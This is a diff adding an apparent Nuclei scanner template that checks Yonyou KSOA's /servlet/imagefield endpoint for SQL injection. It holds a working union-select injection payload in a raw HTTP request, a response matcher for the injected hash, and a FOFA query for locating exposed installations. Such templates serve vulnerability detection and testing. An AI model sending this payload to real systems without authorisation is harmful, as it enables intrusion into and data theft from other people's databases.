@@ -1,0 +1,29 @@
+id: KSOA_imagefield
+info:
+  name: 用友时空KSOA_imagefield
+  author: mike
+  severity: info
+  description: 用友时空KSOA平台 /servlet/imagefield 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
+  reference: https://www.cnblogs.com/pursue-security/p/17684767.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-时空KSOA"
+http:
+  - raw:
+      - |
+        GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '0x098f6bcd4621d373cade4e832627b4f6'
+      - type: word
+        part: header
+        words:
+          - '200'
